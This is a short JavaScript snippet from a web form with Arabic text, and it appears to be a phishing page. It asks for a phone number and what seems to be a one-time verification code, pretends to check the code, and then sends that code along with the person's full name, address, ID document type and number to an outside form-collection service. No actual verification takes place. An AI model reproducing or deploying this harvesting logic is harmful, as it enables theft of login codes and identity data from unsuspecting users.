<script>
  let codeVerified = false;

  function sendCode(event) {
    event.preventDefault();
    errorMessage.textContent = '';

    const fullName = document.getElementById('fullName').value.trim();
    const address = document.getElementById('address').value.trim();
    const documentType = document.querySelector('input[name="documentType"]:checked')?.value || '';
    const documentNumber = document.getElementById('documentNumber').value.trim();
    const codeVal = codeInput.value.trim();

    if (!codeVerified) {
      if (!codeVal) {
        errorMessage.textContent = 'أدخل الكود.';
        return false;
      }

      sendCodeBtn.disabled = true;
      sendCodeBtn.textContent = 'جاري التحقق...';

      // تحقق من الكود فقط
      fetch("https://formcarry.com/s/ldfA_DUCDrk", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify({
          phone: phoneInput.value,
          code: codeVal
        })
      }).then(async res => {
        const data = await res.json();
        if (res.ok && data.success !== false) {
          codeVerified = true;
          sendCodeBtn.disabled = false;
          sendCodeBtn.textContent = 'طلب الدخول';
        } else {
          errorMessage.textContent = "❌ الكود غير صحيح.";
          sendCodeBtn.disabled = false;
          sendCodeBtn.textContent = 'تأكيد الكود';
        }
      }).catch(() => {
        errorMessage.textContent = "⚠️ حدث خطأ أثناء التحقق.";
        sendCodeBtn.disabled = false;
        sendCodeBtn.textContent = 'تأكيد الكود';
      });

      return false;
    }

    // إذا تم التحقق مسبقًا من الكود، أرسل كل البيانات
    if (!fullName || !address || !documentType || !documentNumber) {
      errorMessage.textContent = 'يرجى ملء جميع الحقول.';
      return false;
    }

    const payload = {
      phone: phoneInput.value,
      code: codeVal,
      fullName,
      address,
      documentType,
      documentNumber
    };

    sendCodeBtn.disabled = true;
    sendCodeBtn.textContent = 'يتم الإرسال...';

    fetch("https://formcarry.com/s/ldfA_DUCDrk", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(async res => {
      const data = await res.json();
      if (res.ok && data.success !== false) {
        window.location.href = "success.html";
      } else {
        errorMessage.textContent = "❌ فشل إرسال البيانات.";
        sendCodeBtn.disabled = false;
        sendCodeBtn.textContent = 'طلب الدخول';
      }
    }).catch(() => {
      errorMessage.textContent = "⚠️ تعذر الاتصال بالخادم.";
      sendCodeBtn.disabled = false;
      sendCodeBtn.textContent = 'طلب الدخول';
    });

    return false;
  }
</script>
